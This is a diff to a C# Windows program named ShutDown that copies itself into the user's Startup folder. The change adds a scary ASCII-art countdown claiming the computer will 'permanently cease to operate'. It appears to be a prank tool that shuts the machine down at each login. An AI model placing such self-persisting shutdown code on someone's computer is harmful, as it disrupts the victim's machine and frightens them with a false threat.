@@ -1,12 +1,13 @@
 using System;
 using System.IO;
+using System.Timers;
 using IWshRuntimeLibrary;
 using System.Diagnostics;
 
 /*=============================================================================
  |       AUTHOR:  KESLER MATHIEU
  |     LANGUAGE:  Visual C# Command Line Compiler v4.7.3056.0
- |     TO COMPILE VIA CMD LINE:  csc /reference:Interop.IWshRuntimeLibrary.dll .\ShutDown.cs
+ |     TO COMPILE VIA CMD LINE:  csc /reference:{filepath}\Interop.IWshRuntimeLibrary.dll .\ShutDown.cs
  |     DEPENDENCY: Interop.IwshRuntimeLibrary.dll
  +-----------------------------------------------------------------------------
  |
@@ -54,6 +55,45 @@ namespace WindowExecutables_v2._0
         {
             string pathTemplate = @"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
             this.localStartupDir = pathTemplate.Replace("{0}", Environment.UserName);
+        }
+
+
+        public static void displayDestructionMsg(int countdown)
+        {
+            if (countdown > 0)
+                {
+                string img = @"
+                                         ::================:          
+                                        / ||              ||        
+                                       /  ||    System    ||        
+                                      |   ||   ShutDown   ||                
+                                       \  || Please wait..||
+                                        \ ||              || 
+                                         ::=================              
+                                   ........... /      \.............                                                         
+                                   :\        ############            \   
+                                   : ---------------------------------     
+                                   : |  *   |__________|| ::::::::::  |                                             
+                                   \ |      |          ||   .......   |    
+                                     --------------------------------- 8   
+                                                                        8 
+                                     --------------------------------- 8   
+                                     \   ###########################  \    
+                                      \  +++++++++++++++++++++++++++   \ 
+                                       \ ++++++++++++++++++++++++++++   \
+                                        \________________________________\ 
+                                         ********************************* 
+                                            -Targon (Ed Wisniewski)-";
+
+                Console.WriteLine(img+"\n");
+
+                while (countdown >= 0)
+                    {
+                    Console.WriteLine("                                    COMPUTER WILL PERMANENTLY CEASE TO OPERATE IN: " + countdown.ToString() + " SECONDS!");
+                    countdown--;
+                    System.Threading.Thread.Sleep(1000);
+                    }
+                }
         }
 
         public string getLocalStartupDir()
@@ -165,6 +205,7 @@ namespace WindowExecutables_v2._0
          */
         public static void Main()
         {
+            ShutDown.displayDestructionMsg(countdown:10);
             ShutDown sysOff = new ShutDown();
             int moveToStartupStatus = sysOff.moveExeToStartupDir();
             Console.WriteLine(moveToStartupStatus);
